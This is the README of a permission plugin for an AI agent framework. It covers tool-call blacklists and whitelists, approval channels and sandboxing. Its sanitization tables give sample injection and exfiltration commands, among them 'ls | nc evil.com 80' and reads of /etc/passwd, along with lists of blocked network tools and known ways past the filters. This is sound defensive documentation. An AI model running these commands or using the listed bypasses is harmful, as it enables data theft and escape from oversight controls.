# Permission Plugin

The permission plugin (`askPermission`) provides access control for tool execution in the jaato orchestration framework. It intercepts tool calls and enforces blacklist/whitelist policies, with support for interactive approval when policies are ambiguous.

## Demo

The demo below shows the permission plugin intercepting a tool execution request and displaying the interactive approval prompt with options (yes, no, always, never, etc.).



## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                           JaatoClient                               │
│                                                                     │
│  ┌─────────────┐    ┌─────────────────┐    ┌──────────────────┐   │
│  │PluginRegistry│───▶│  ToolExecutor   │◀───│PermissionPlugin  │   │
│  │             │    │                 │    │                  │   │
│  │ - cli       │    │ execute(name,   │    │ check_permission │   │
│  │ - mcp       │    │          args)  │    │                  │   │
│  │ - ...       │    │       │         │    └────────┬─────────┘   │
│  └─────────────┘    │       ▼         │             │             │
│                     │ ┌───────────┐   │    ┌────────▼─────────┐   │
│                     │ │ Permission│   │    │ PermissionPolicy │   │
│                     │ │   Check   │◀──┼────│                  │   │
│                     │ └─────┬─────┘   │    │ - blacklist      │   │
│                     │       │         │    │ - whitelist      │   │
│                     │       ▼         │    │ - session rules  │   │
│                     │  [if allowed]   │    └────────┬─────────┘   │
│                     │       │         │             │             │
│                     │       ▼         │    ┌────────▼─────────┐   │
│                     │  Execute Tool   │    │      Channel       │   │
│                     └─────────────────┘    │ (if ASK_CHANNEL)   │   │
│                                            └──────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

## Plugin Interaction

### Execution Flow

1. **Model requests tool execution** (e.g., `cli_based_tool`)
2. **ToolExecutor.execute()** intercepts the call
3. **PermissionPlugin.check_permission()** evaluates the request:
   - Check session blacklist (highest priority)
   - Check static blacklist
   - Check session whitelist
   - Check static whitelist
   - Apply default policy or ask channel
4. **If allowed**: Original plugin executor runs
5. **If denied**: Error returned to model

### Dual Nature: Middleware vs Plugin

The permission plugin is unique - it has two distinct roles controlled separately:

| Role | Purpose | Control |
|------|---------|---------|
| **Middleware** | Enforces permissions on ALL tool executions | `executor.set_permission_plugin()` |
| **Plugin** | Exposes `askPermission` tool for model to query | Exposed by default via `registry.expose_all()` |

```python
# 1. All plugins are exposed by default (including permission)
registry.expose_all({
    "cli": {"extra_paths": ["/usr/local/bin"]},
})

# 2. Permission plugin as MIDDLEWARE (enforcement layer)
permission_plugin = PermissionPlugin()
permission_plugin.initialize(config)
executor.set_permission_plugin(permission_plugin)
```

**As middleware** (via `set_permission_plugin`):
- Wraps `ToolExecutor.execute()` to check permissions before ANY tool runs
- CLI plugin tools (`cli_based_tool`) → checked
- MCP plugin tools (any MCP server tool) → checked
- `askPermission` tool → always allowed (to prevent deadlock)

**As plugin** (via `registry.expose_all()`):
- Exposes `askPermission` tool so the model can proactively query permissions
- Exposed by default with all other plugins
- Useful when you want the model to check before attempting blocked actions
- Can be unexposed via `registry.unexpose_tool("permission")` if not needed

## Client Integration

### Method 1: Via JaatoClient (Recommended)

```python
from shared import JaatoClient, PluginRegistry, PermissionPlugin

# Create and connect client
jaato = JaatoClient()
jaato.connect(project="my-project", location="us-central1", model="gemini-2.5-flash")

# Set up plugin registry
registry = PluginRegistry()
registry.discover()
registry.expose_all()  # All plugins exposed by default

# Create and initialize permission plugin
permission_plugin = PermissionPlugin()
permission_plugin.initialize({
    "config_path": "permissions.json",  # Optional: path to config file
    "channel_type": "console",            # console, webhook, or file
})

# Configure tools with permission control
jaato.configure_tools(registry, permission_plugin=permission_plugin)

# Run with permission control
response = jaato.send_message("List files in the current directory")
```

### Method 2: Manual Integration with ToolExecutor

```python
from shared import ToolExecutor, PluginRegistry
from shared.plugins.permission import PermissionPlugin

# Create executor
executor = ToolExecutor()

# Set up plugin registry
registry = PluginRegistry()
registry.discover()
registry.expose_all()

# Register plugin executors
for name, fn in registry.get_exposed_executors().items():
    executor.register(name, fn)

# Initialize and attach permission plugin
permission_plugin = PermissionPlugin()
permission_plugin.initialize({
    "policy": {
        "defaultPolicy": "ask",
        "blacklist": {"patterns": ["rm -rf *", "sudo *"]},
        "whitelist": {"patterns": ["git *", "ls *"]}
    },
    "channel_type": "console"
})
executor.set_permission_plugin(permission_plugin)

# Register askPermission tool
for name, fn in permission_plugin.get_executors().items():
    executor.register(name, fn)
```

### Method 3: Environment-Based Configuration

```bash
# Set config path via environment
export PERMISSION_CONFIG_PATH=/path/to/permissions.json
export PERMISSION_WEBHOOK_TOKEN=secret-token  # For webhook channel

# Run your script
python cli_vs_mcp/cli_mcp_harness.py --scenarios get_page
```

### Programmatic Whitelist Management

Plugins can declare tools that should be auto-approved via `get_auto_approved_tools()`. When using `JaatoClient.configure_tools()`, these are automatically added to the permission whitelist:

```python
# This happens automatically in configure_tools():
auto_approved = registry.get_auto_approved_tools()
permission_plugin.add_whitelist_tools(auto_approved)
```

You can also manually add tools to the whitelist:

```python
# Add specific tools to whitelist
permission_plugin.add_whitelist_tools(['tool1', 'tool2'])
```

## Permission Config Parameter

The configuration dict passed to `PermissionPlugin.initialize()` controls how the plugin is configured.

### Config Structure

```python
permission_config = {
    # Path to permissions.json file (optional)
    "config_path": "permissions.json",

    # Inline policy - overrides file if provided (optional)
    "policy": {
        "defaultPolicy": "ask",
        "blacklist": {...},
        "whitelist": {...}
    },

    # Channel type: "console", "webhook", or "file"
    "channel_type": "console",

    # Channel-specific configuration (optional)
    "channel_config": {
        "timeout": 30,
        "endpoint": "https://...",  # for webhook
        "base_path": "/tmp/approvals"  # for file
    }
}
```

### Config Options Reference

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `config_path` | `str` | `None` | Path to `permissions.json` file |
| `policy` | `dict` | `None` | Inline policy dict (overrides file) |
| `channel_type` | `str` | `"console"` | Channel type for interactive approval |
| `channel_config` | `dict` | `{}` | Channel-specific settings |

### Channel-Specific Configuration

**Console Channel** (`channel_type: "console"`):

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `use_colors` | `bool` | `True` | Enable ANSI colorized output for prompts and diffs |
| `skip_readline_history` | `bool` | `True` | Avoid polluting readline history with y/n responses |

**Output Callback Support**: The console channel supports real-time output via the `OutputCallback` mechanism. When a callback is set (via `set_output_callback()`), permission prompts are emitted through the callback with `source="permission"` instead of being printed directly to the console. This enables clients to integrate permission prompts into their own output handling.

**Webhook Channel** (`channel_type: "webhook"`):

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `endpoint` | `str` | Required | URL to send permission requests to |
| `timeout` | `int` | `30` | Request timeout in seconds |
| `headers` | `dict` | `{}` | Additional HTTP headers |
| `auth_token` | `str` | `None` | Bearer token (or use `PERMISSION_WEBHOOK_TOKEN` env var) |

**File Channel** (`channel_type: "file"`):

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `base_path` | `str` | Required | Directory for request/response files |
| `poll_interval` | `float` | `0.5` | Seconds between polling attempts |

### Dual Nature: Enforcement vs Tool

The permission plugin has two distinct roles that are controlled independently:

| Role | Description | Control |
|------|-------------|---------|
| **Permission enforcement** | Wraps `ToolExecutor.execute()` to check permissions before any tool runs | `executor.set_permission_plugin(plugin)` |
| **askPermission tool** | Exposes a tool for the model to proactively query permissions | Exposed by default via `registry.expose_all()` |

**Both enforcement and proactive tool (default):**
```python
# All plugins exposed by default (including permission)
registry.expose_all()

# Initialize and set permission plugin for enforcement
permission_plugin = PermissionPlugin()
permission_plugin.initialize({"config_path": "permissions.json"})
executor.set_permission_plugin(permission_plugin)
```

**Enforcement only (no askPermission tool exposed to model):**
```python
# Expose all plugins, then unexpose permission
registry.expose_all()
registry.unexpose_tool("permission")

# Initialize and set permission plugin for enforcement
permission_plugin = PermissionPlugin()
permission_plugin.initialize({"config_path": "permissions.json"})
executor.set_permission_plugin(permission_plugin)
```

Use enforcement-only when you want:
- Transparent permission enforcement without model awareness
- Simpler tool surface for the model
- Permission denials to appear as direct errors

### Example Configurations

**Minimal (uses defaults + environment):**
```python
permission_plugin = PermissionPlugin()
permission_plugin.initialize(None)  # Uses PERMISSION_CONFIG_PATH env or defaults
```

**File-based configuration:**
```python
permission_plugin = PermissionPlugin()
permission_plugin.initialize({
    "config_path": "permissions.json",
    "channel_type": "console"
})
```

**Inline policy (no file needed):**
```python
permission_plugin = PermissionPlugin()
permission_plugin.initialize({
    "policy": {
        "defaultPolicy": "deny",
        "blacklist": {
            "patterns": ["rm -rf *", "sudo *"]
        },
        "whitelist": {
            "patterns": ["git *", "npm *", "python *"]
        }
    },
    "channel_type": "console"
})
```

**Webhook channel for external approval:**
```python
permission_plugin = PermissionPlugin()
permission_plugin.initialize({
    "config_path": "permissions.json",
    "channel_type": "webhook",
    "channel_config": {
        "endpoint": "https://approvals.example.com/api/permission",
        "timeout": 60,
        "headers": {"X-Service": "jaato"}
    }
})
```

**Harness integration pattern:**
```python
from shared import JaatoClient, PluginRegistry, PermissionPlugin

# Configuration
harness_config = {
    "model": "gemini-2.5-flash",
    "enable_permissions": True,
    "permission_config": {
        "config_path": "permissions.json",
        "channel_type": "console"
    }
}

# Setup
jaato = JaatoClient()
jaato.connect(project="my-project", location="us-central1", model=harness_config["model"])

registry = PluginRegistry()
registry.discover()
registry.expose_all()

permission_plugin = None
if harness_config.get("enable_permissions"):
    permission_plugin = PermissionPlugin()
    permission_plugin.initialize(harness_config.get("permission_config"))

jaato.configure_tools(registry, permission_plugin=permission_plugin)

# Run
response = jaato.send_message(scenario_prompt)
```

## Configuration

### permissions.json Structure

```json
{
  "version": "1.0",
  "defaultPolicy": "ask",

  "blacklist": {
    "tools": ["dangerous_tool"],
    "patterns": ["rm -rf *", "sudo *", "chmod 777 *"],
    "arguments": {
      "cli_based_tool": {
        "command": ["rm -rf", "sudo", "shutdown", "reboot"]
      }
    }
  },

  "whitelist": {
    "tools": ["search_issues", "get_page"],
    "patterns": ["git *", "npm *", "python *", "pytest *"],
    "arguments": {
      "cli_based_tool": {
        "command": ["git", "npm", "pip"]
      }
    }
  },

  "channel": {
    "type": "console",
    "timeout": 30,
    "endpoint": "https://approvals.example.com/api/permission"
  }
}
```

### Rule Types: tools vs patterns vs arguments

The blacklist and whitelist each support three types of rules. They serve different purposes and match differently.

#### `tools` - Match by Tool Name

Matches the exact tool name. Use this for blanket allow/deny of entire tools.

```json
{
  "blacklist": {
    "tools": ["dangerous_tool", "admin_tool"]
  },
  "whitelist": {
    "tools": ["search_issues", "get_page"]
  }
}
```

| Tool Call | Blacklist Match | Whitelist Match |
|-----------|-----------------|-----------------|
| `dangerous_tool({...})` | YES | - |
| `search_issues({...})` | - | YES |
| `cli_based_tool({...})` | - | - |

**Use case**: When you want to completely block or allow a specific tool regardless of its arguments.

#### `patterns` - Match Command Signatures (Glob-Style)

Matches against a "signature" string built from the tool call. Uses glob-style wildcards (`*`).

**For `cli_based_tool`**: The signature is the full command string.
```
cli_based_tool({"command": "git push origin main"})
  → signature: "git push origin main"
```

**For other tools**: The signature is `tool_name(arg1=val1, arg2=val2, ...)`.
```
search_issues({"query": "bug", "limit": 10})
  → signature: "search_issues(limit=10, query=bug)"
```

```json
{
  "blacklist": {
    "patterns": ["rm -rf *", "sudo *", "chmod 777 *"]
  },
  "whitelist": {
    "patterns": ["git *", "npm test", "python *.py"]
  }
}
```

| Command | Pattern | Match? |
|---------|---------|--------|
| `git status` | `git *` | YES |
| `git push origin main` | `git *` | YES |
| `rm -rf /tmp/cache` | `rm -rf *` | YES |
| `rm file.txt` | `rm -rf *` | NO (missing `-rf`) |
| `sudo apt update` | `sudo *` | YES |
| `python script.py` | `python *.py` | YES |
| `python -m pytest` | `python *.py` | NO |

**Use case**: When you want to allow/deny commands based on their structure, especially for CLI tools where the command prefix determines safety.

#### `arguments` - Match Specific Argument Values

Matches specific values within specific arguments of specific tools. Provides fine-grained control.

```json
{
  "blacklist": {
    "arguments": {
      "cli_based_tool": {
        "command": ["rm -rf", "sudo", "shutdown", "reboot", "mkfs"]
      }
    }
  },
  "whitelist": {
    "arguments": {
      "cli_based_tool": {
        "command": ["git", "npm", "pip", "python"]
      }
    }
  }
}
```

**Matching logic**:
- For blacklist: Blocks if the argument value **starts with** or **contains** any blocked value
- For whitelist: Allows if the argument value **starts with** any allowed value

| Command | Blacklist `["rm -rf", "sudo"]` | Whitelist `["git", "npm"]` |
|---------|-------------------------------|---------------------------|
| `rm -rf /tmp` | BLOCKED (starts with `rm -rf`) | - |
| `rm file.txt` | allowed | - |
| `sudo apt update` | BLOCKED (starts with `sudo`) | - |
| `git status` | - | ALLOWED (starts with `git`) |
| `git push` | - | ALLOWED (starts with `git`) |
| `npm install` | - | ALLOWED (starts with `npm`) |
| `python test.py` | - | not matched |

**Use case**: When you need to control based on the actual command being run, not just the pattern. More precise than patterns for argument-level filtering.

### Comparison: When to Use Each

| Rule Type | Granularity | Best For |
|-----------|-------------|----------|
| `tools` | Tool-level | Blocking/allowing entire tools (e.g., block all MCP tools) |
| `patterns` | Signature-level | Command structure matching with wildcards (e.g., `git *`) |
| `arguments` | Argument-level | Precise control over specific argument values |

### Combined Example

```json
{
  "blacklist": {
    "tools": ["admin_dangerous_tool"],
    "patterns": ["* --force", "* -rf *"],
    "arguments": {
      "cli_based_tool": {
        "command": ["sudo", "shutdown", "reboot"]
      }
    }
  },
  "whitelist": {
    "tools": ["search_issues"],
    "patterns": ["git status", "git diff *", "npm test"],
    "arguments": {
      "cli_based_tool": {
        "command": ["git", "npm", "pip"]
      }
    }
  }
}
```

This configuration:
1. **Blocks** `admin_dangerous_tool` entirely (tools)
2. **Blocks** any command with `--force` flag (patterns)
3. **Blocks** any command starting with `sudo`, `shutdown`, `reboot` (arguments)
4. **Allows** `search_issues` tool entirely (tools)
5. **Allows** `git status`, `git diff` commands (patterns)
6. **Allows** commands starting with `git`, `npm`, `pip` (arguments)

### Policy Evaluation Rules

| Priority | Rule Type | Effect |
|----------|-----------|--------|
| 1 | Session blacklist | DENY (added via channel "never" response) |
| 2 | Static blacklist | DENY |
| 3 | Session whitelist | ALLOW (added via channel "always" response) |
| 4 | Static whitelist | ALLOW |
| 5 | Default policy | "allow", "deny", or "ask" |

**Key principle**: Blacklist ALWAYS takes priority over whitelist.

### Evaluation Order Within Each List

Within blacklist (or whitelist), rules are checked in this order:
1. `tools` - exact tool name match
2. `patterns` - glob pattern match against signature
3. `arguments` - argument value match

First match wins within each priority level.

## Channel Types

### Console Channel (Interactive)

Prompts the user in the terminal:

```
============================================================
[askPermission] Tool execution request:
  Intent: Check if there are uncommitted changes before deployment
  Tool: cli_based_tool
  Arguments: {"command": "git status"}
============================================================

Options: [y]es, [n]o, [a]lways, [never], [once], [all]
>
```

The **Intent** field shows what the model is trying to achieve with the tool execution, helping users make informed decisions.

Responses:
| Input | Effect |
|-------|--------|
| `y` / `yes` | Allow this execution |
| `n` / `no` | Deny this execution |
| `a` / `always` | Allow and add this tool to session whitelist |
| `never` | Deny and add this tool to session blacklist |
| `once` | Allow but don't remember |
| `all` | Pre-approve ALL future requests in this session |

**Readline History**: By default, permission responses are automatically excluded from readline history since they have no utility for recall. This can be disabled via config:

```python
channel_config = {
    "skip_readline_history": False  # Include responses in readline history
}
```

### Webhook Channel (External Approval)

Sends HTTP POST to configured endpoint:

```json
{
  "request_id": "uuid",
  "timestamp": "2024-01-15T10:30:00Z",
  "tool_name": "cli_based_tool",
  "arguments": {"command": "git push"},
  "timeout_seconds": 30,
  "context": {"session_id": "..."}
}
```

Expected response:

```json
{
  "request_id": "uuid",
  "decision": "allow",
  "reason": "Approved by admin",
  "remember": true,
  "remember_pattern": "git *"
}
```

### File Channel (Async Approval)

For background/automated approval workflows:
1. Writes request to `{base_path}/requests/{request_id}.json`
2. Polls for response at `{base_path}/responses/{request_id}.json`
3. External process reads request, writes response

## Orchestration Framework Integration

### Harness Integration Example

```python
from shared import JaatoClient, PluginRegistry, PermissionPlugin

def run_scenario(scenario_name: str, config: Dict) -> str:
    # Create client
    jaato = JaatoClient()
    jaato.connect(
        project=config["project"],
        location=config["location"],
        model=config["model"]
    )

    # Set up plugins
    registry = PluginRegistry()
    registry.discover()
    registry.expose_all()

    # Initialize permission plugin based on config
    permission_plugin = None
    if config.get("enable_permissions", False):
        permission_plugin = PermissionPlugin()
        permission_plugin.initialize(config.get("permission_config"))

    jaato.configure_tools(registry, permission_plugin=permission_plugin)

    # Run and return response
    # Permission decisions are recorded via the ledger
    return jaato.send_message(scenario_prompt)
```

### Ledger Events

The permission plugin records events to the TokenLedger:

| Event Stage | Description |
|-------------|-------------|
| `permission-check` | Every permission evaluation (tool, args, allowed, reason, method) |
| `permission-error` | Permission check failures |
| `permission-init-error` | Plugin initialization failures |

Example ledger entry:
```json
{
  "stage": "permission-check",
  "ts": 1705312200.123,
  "tool": "cli_based_tool",
  "args": {"command": "git status"},
  "allowed": true,
  "reason": "Command matches whitelist pattern: git *",
  "method": "whitelist"
}
```

The `method` field indicates how the decision was made:
- `whitelist` / `blacklist`: Matched static policy rule
- `session_whitelist` / `session_blacklist`: Matched session rule
- `user_approved` / `user_denied`: Channel approval
- `allow_all`: User pre-approved all requests for this session
- `timeout`: Channel timed out
- `default`: Default policy applied

### Permission Metadata in Function Responses

When the permission plugin is active, permission metadata is automatically injected into function responses under the `_permission` key:

```json
{
  "stdout": "hello\n",
  "stderr": "",
  "returncode": 0,
  "_permission": {
    "decision": "allowed",
    "reason": "User approved execution",
    "method": "user_approved"
  }
}
```

This allows clients to display permission decisions alongside tool results in conversation history. The `_permission` key uses an underscore prefix to indicate it's metadata rather than part of the actual tool output.

### Proactive Permission Checks

The model can use the `askPermission` tool to check before executing. The `intent` field is **required** - the model must explain what it's trying to achieve:

```
Model: Before running this command, let me check if it's allowed.
       [calls askPermission(
           tool_name="cli_based_tool",
           intent="Clean up temporary build artifacts from the temp directory",
           arguments={"command": "rm -rf temp/"}
       )]

Response: {"allowed": false, "reason": "Command matches blacklist pattern: rm -rf *", "method": "blacklist", "tool_name": "cli_based_tool"}

Model: I cannot execute that command as it's blocked by the permission policy.
       Would you like me to use a safer alternative?
```

The intent helps users understand WHY the model wants to run a command, making approval decisions easier.

## Context Parameter

The permission system supports an optional `context` parameter that provides additional information to channels when making approval decisions. This context flows through the entire permission check pipeline.

### Setting Context

Context is set when attaching the permission plugin to the executor:

```python
executor.set_permission_plugin(
    permission_plugin,
    context={
        "session_id": "abc-123",
        "user_id": "user@example.com",
        "turn_number": 5,
        "previous_tools": ["search_issues", "get_page"],
        "project": "my-project",
    }
)
```

### Context Flow

```
ToolExecutor.set_permission_plugin(plugin, context)
        │
        ▼
ToolExecutor.execute(name, args)
        │
        ▼
PermissionPlugin.check_permission(name, args, context)
        │
        ▼ (if ASK_CHANNEL)
PermissionRequest.create(..., context=context)
        │
        ▼
Channel.request_permission(request)
        │
        ▼
Channel displays/uses context for decision
```

### Context in Channel Requests

When an channel is invoked, the context is included in the permission request:

**Console Channel Display:**
```
============================================================
[askPermission] Tool execution request:
  Tool: cli_based_tool
  Arguments: {"command": "git push origin main"}
  Context: {"session_id": "abc-123", "turn_number": 5, "user_id": "admin"}
============================================================
```

**Webhook Request Payload:**
```json
{
  "request_id": "uuid",
  "timestamp": "2024-01-15T10:30:00Z",
  "tool_name": "cli_based_tool",
  "arguments": {"command": "git push"},
  "timeout_seconds": 30,
  "default_on_timeout": "deny",
  "context": {
    "session_id": "abc-123",
    "user_id": "admin",
    "turn_number": 5,
    "previous_tools": ["search_issues"]
  }
}
```

### Common Context Fields

| Field | Description |
|-------|-------------|
| `session_id` | Unique identifier for the current session |
| `user_id` | Identifier for the user or service account |
| `turn_number` | Current turn in the conversation loop |
| `previous_tools` | List of tools already executed in this session |
| `project` | Project or workspace identifier |
| `environment` | Environment name (dev, staging, prod) |
| `request_source` | Origin of the request (cli, api, scheduled) |

### Dynamic Context Updates

For scenarios where context changes during execution (e.g., tracking turn numbers), you can update context by re-setting the permission plugin:

```python
# Update context with new turn number
executor.set_permission_plugin(
    permission_plugin,
    context={**base_context, "turn_number": current_turn}
)
```

Or access the executor's context directly:

```python
executor._permission_context["turn_number"] = current_turn
```

## Sandboxing and Sanitization

The permission plugin includes sanitization features to help sandbox the model's tool execution. These provide **application-level** security that complements (but does not replace) **OS-level** isolation.

### Enabling Sanitization

**Via permissions.json:**
```json
{
  "defaultPolicy": "deny",
  "sanitization": {
    "enabled": true,
    "block_shell_metacharacters": true,
    "block_dangerous_commands": true,
    "allowed_dangerous_commands": [],
    "custom_blocked_commands": ["custom_cmd"],
    "path_scope": {
      "enabled": true,
      "allowed_roots": ["."],
      "block_absolute": true,
      "block_parent_traversal": true,
      "allow_home": false
    }
  }
}
```

**Programmatically:**
```python
from shared.plugins.permission import PermissionPolicy, create_strict_config

policy = PermissionPolicy.from_config(config)
policy.enable_strict_sandbox(cwd="/path/to/workspace")

# Or manually:
policy.set_sanitization(
    config=create_strict_config("/path/to/workspace"),
    cwd="/path/to/workspace"
)
```

### Sanitization Features

#### Shell Injection Prevention

Blocks shell metacharacters and injection patterns:

| Blocked | Example | Attack Vector |
|---------|---------|---------------|
| `;` | `ls; cat /etc/passwd` | Command chaining |
| `\|` | `ls \| nc evil.com 80` | Pipe to exfiltration |
| `&` | `malware &` | Background execution |
| `` ` `` | `` ls `whoami` `` | Command substitution |
| `$()` | `$(cat /etc/passwd)` | Command substitution |
| `${}` | `${HOME}` | Variable expansion |
| `>` `<` | `> /etc/passwd` | Redirection |

#### Dangerous Command Blocking

Blocks known dangerous commands by default:

| Category | Commands |
|----------|----------|
| Privilege escalation | `sudo`, `su`, `doas`, `pkexec` |
| System control | `shutdown`, `reboot`, `halt`, `init` |
| Destructive | `rm`, `rmdir`, `mkfs`, `dd`, `shred` |
| Network | `curl`, `wget`, `nc`, `ssh`, `scp`, `ftp` |
| Process control | `kill`, `killall`, `pkill` |
| Permissions | `chmod`, `chown`, `chgrp` |

Override with `allowed_dangerous_commands`:
```json
{
  "sanitization": {
    "enabled": true,
    "block_dangerous_commands": true,
    "allowed_dangerous_commands": ["rm", "curl"]
  }
}
```

#### Path Scope Validation

Restricts file access to allowed directories:

```json
{
  "sanitization": {
    "enabled": true,
    "path_scope": {
      "enabled": true,
      "allowed_roots": [".", "./data", "/tmp/workspace"],
      "block_absolute": true,
      "block_parent_traversal": true,
      "allow_home": false
    }
  }
}
```

| Path | `block_absolute` | `block_parent_traversal` | Result |
|------|------------------|--------------------------|--------|
| `./file.txt` | - | - | ALLOWED |
| `/etc/passwd` | true | - | BLOCKED |
| `../secret.txt` | - | true | BLOCKED |
| `~/private.key` | - | - | BLOCKED (if `allow_home: false`) |
| `./foo/../../../etc/passwd` | - | true | BLOCKED |

### What Sanitization Does NOT Prevent

**Application-level sanitization has limits.** These attacks can bypass it:

| Attack | Example | Why It Bypasses |
|--------|---------|-----------------|
| Symlink attacks | `ln -s /etc/passwd ./safe` | Path resolves after link creation |
| Encoded paths | `cat %2e%2e/etc/passwd` | URL encoding |
| Time-of-check attacks | Race conditions | Check vs execution gap |
| Indirect exfiltration | `python -c "..."` | Arbitrary code execution |

### OS-Level Sandboxing (Required for Production)

For true isolation, wrap execution in OS-level sandboxes:

```
┌──────────────────────────────────────────────────────────────┐
│ Application Layer (this plugin)                               │
│ - Permission policies (blacklist/whitelist)                  │
│ - Sanitization (shell injection, path scope)                 │
│ - Channel approval                                              │
└──────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌──────────────────────────────────────────────────────────────┐
│ OS Layer (REQUIRED for production)                           │
│ - Containers (Docker, Podman, gVisor)                        │
│ - Namespaces (PID, network, mount, user)                     │
│ - seccomp profiles (syscall filtering)                       │
│ - cgroups (resource limits)                                  │
│ - Read-only filesystems                                      │
│ - Network isolation (no outbound by default)                 │
└──────────────────────────────────────────────────────────────┘
```

**Example Docker sandbox:**
```python
import subprocess

def sandboxed_execute(command: str, workspace: str) -> dict:
    result = subprocess.run([
        "docker", "run", "--rm",
        "--network=none",              # No network access
        "--read-only",                 # Read-only root filesystem
        f"--workdir=/workspace",
        f"-v={workspace}:/workspace",  # Mount workspace
        "--memory=512m",               # Memory limit
        "--cpus=1",                    # CPU limit
        "--pids-limit=100",            # Process limit
        "--security-opt=no-new-privileges",
        "sandbox-image:latest",
        "sh", "-c", command
    ], capture_output=True, text=True, timeout=30)

    return {
        "stdout": result.stdout,
        "stderr": result.stderr,
        "returncode": result.returncode
    }
```

### Defense in Depth Checklist

| Layer | Protection | Status |
|-------|------------|--------|
| **Application** | Permission plugin | This plugin |
| **Application** | Sanitization (shell, paths) | This plugin |
| **Application** | Audit logging | This plugin (ledger) |
| **OS** | Container isolation | Implement separately |
| **OS** | Network isolation | Implement separately |
| **OS** | Resource limits | Implement separately |
| **OS** | Syscall filtering | Implement separately |

## Security Considerations

1. **Fail-safe defaults**: Permission check failures result in DENY
2. **No self-bypass**: askPermission tool cannot modify its own permissions
3. **Session isolation**: Session rules don't persist across runs
4. **Audit trail**: All decisions logged to ledger for review
5. **Timeout handling**: Channel timeouts default to DENY (configurable)
6. **Sanitization runs first**: Before blacklist/whitelist checks
7. **Defense in depth**: Application controls + OS isolation required

## File Locations

| File | Purpose |
|------|---------|
| `permissions.json` | Project-level config (in project root) |
| `.permissions.json` | Hidden config alternative |
| `~/.config/jaato/permissions.json` | User-level default config |
| `PERMISSION_CONFIG_PATH` env var | Override config path |

## User Commands

The permission plugin provides a user-facing command for on-the-fly session permission management. This command is **not exposed to the model** (`share_with_model=False`) - only the user can invoke it.

### `permissions` Command

Manage session permissions without modifying the persistent `permissions.json` file. All changes are session-scoped and lost when the session ends.

#### Subcommands

| Command | Description |
|---------|-------------|
| `permissions show` | Display current effective policy with diff from base config |
| `permissions allow <pattern>` | Add tool/pattern to session whitelist |
| `permissions deny <pattern>` | Add tool/pattern to session blacklist |
| `permissions default <policy>` | Set session default policy (allow\|deny\|ask) |
| `permissions clear` | Reset all session modifications |

#### Usage Examples

**View current policy:**
```
> permissions show
Effective Permission Policy
═══════════════════════════

Default Policy: ask

Session Rules:
  (none)

Base Config:
  Whitelist: git, npm *, python *
  Blacklist: rm -rf *, sudo *
```

**Allow a tool for the session:**
```
> permissions allow docker *
+ Added to session whitelist: docker *
```

**Deny a tool for the session:**
```
> permissions deny cli_based_tool
- Added to session blacklist: cli_based_tool
```

**Change default policy for the session:**
```
> permissions default allow
Session default policy: allow (was: ask)
```

**View updated policy with session rules:**
```
> permissions show
Effective Permission Policy
═══════════════════════════

Default Policy: allow (session override, was: ask)

Session Rules:
  + allow: docker *
  - deny:  cli_based_tool

Base Config:
  Whitelist: git, npm *, python *
  Blacklist: rm -rf *, sudo *
```

**Clear all session modifications:**
```
> permissions clear
Session rules cleared.
Reverted to base config.
```

#### Priority Order

Session rules take priority over base configuration:

| Priority | Rule Type | Description |
|----------|-----------|-------------|
| 1 | Session blacklist | Added via `permissions deny` |
| 2 | Static blacklist | From `permissions.json` |
| 3 | Session whitelist | Added via `permissions allow` |
| 4 | Static whitelist | From `permissions.json` |
| 5 | Session default | Set via `permissions default` |
| 6 | Base default | From `permissions.json` |

#### Use Cases

- **Quick testing**: Temporarily allow a tool without editing config files
- **Emergency override**: Block a tool that's misbehaving during a session
- **Interactive exploration**: Adjust permissions as you discover what tools are needed
- **Safety net**: Start restrictive (`default deny`) and progressively allow tools as needed
